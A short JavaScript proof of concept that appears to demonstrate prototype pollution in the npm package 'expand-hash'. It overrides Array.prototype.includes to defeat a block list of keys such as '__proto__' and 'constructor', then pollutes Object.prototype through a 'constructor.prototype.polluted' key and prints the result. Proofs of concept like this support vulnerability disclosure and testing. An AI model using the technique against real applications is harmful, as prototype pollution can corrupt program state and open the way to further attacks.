Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var expandHash = require('expand-hash');
var obj = {};
console.log({}.polluted);
expandHash({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);